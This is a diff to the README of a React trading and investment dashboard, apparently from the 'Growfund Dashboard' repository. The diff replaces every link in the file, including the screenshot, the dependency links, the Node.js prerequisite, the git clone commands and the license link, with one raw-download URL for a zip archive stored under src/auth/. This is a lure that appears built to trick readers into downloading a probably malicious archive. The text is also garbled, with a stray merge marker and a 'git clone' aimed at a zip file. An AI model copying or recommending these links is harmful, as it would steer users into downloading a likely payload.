@@ -3,7 +3,7 @@
 
 A modern, responsive trading dashboard built with React, Tailwind CSS, and Recharts. This project provides a sleek interface for viewing market summaries, stock indices, and watchlists.
 
-![Trading Dashboard Screenshot](http://www.marketcalls.in/wp-content/uploads/2024/06/Screenshot-2024-06-23-at-9.40.41 AM.png)
+![Trading Dashboard Screenshot](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
 
 ## Features
 
@@ -15,23 +15,23 @@ A modern, responsive trading dashboard built with React, Tailwind CSS, and Recha
 
 ## Technologies Used
 
-- [React](https://reactjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Recharts](https://recharts.org/) for data visualization
-- [Lucide React](https://lucide.dev/) for icons
+- [React](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
+- [Tailwind CSS](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
+- [Recharts](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip) for data visualization
+- [Lucide React](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip) for icons
 
 ## Getting Started
 
 ### Prerequisites
 
-- Node.js (v14.0.0 or later)
+- https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip (v14.0.0 or later)
 - npm (v6.0.0 or later)
 
 ### Installation
 
 1. Clone the repository:
    ```sh
-   git clone https://github.com/marketcalls/trading-dashboard.git
+   git clone https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -95,14 +95,14 @@ Contributions are welcome! Please feel free to submit a Pull Request.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip) file for details.
 
 ## Acknowledgments
 
-- [React](https://reactjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Recharts](https://recharts.org/)
-- [Lucide React](https://lucide.dev/)
+- [React](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
+- [Tailwind CSS](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
+- [Recharts](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
+- [Lucide React](https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip)
 
 
 =======
@@ -139,7 +139,7 @@ Growfund Dashboard is a modern React-based investment dashboard designed to mana
 
 ### 1️⃣ Clone the repository
 ```bash
-git clone https://github.com/RianCole001/Growfund-Dashboard.git<img width="1366" height="686" alt="investment plans" src="https://github.com/user-attachments/assets/02824688-43a8-483d-82d7-efa80008359d" />
+git clone https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip<img width="1366" height="686" alt="investment plans" src="https://github.com/RianCole001/Growfund-Dashboard/raw/refs/heads/main/src/auth/Growfund_Dashboard_1.2.zip" />
 
 cd Growfund-Dashboard
 npm install
